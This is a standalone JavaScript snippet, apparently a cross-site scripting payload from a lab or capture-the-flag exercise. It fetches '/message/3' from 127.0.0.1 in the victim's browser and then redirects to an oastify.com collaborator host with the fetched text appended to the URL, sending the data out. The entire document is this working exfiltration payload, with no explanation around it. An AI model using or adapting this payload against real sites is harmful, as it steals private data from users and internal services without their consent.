var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://127.0.0.1/message/3');
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        window.location = 'http://betn02sdx7csylo9baybdpwuyl4cs1.oastify.com/q='+xhr.responseText;
    }
}
xhr.send();
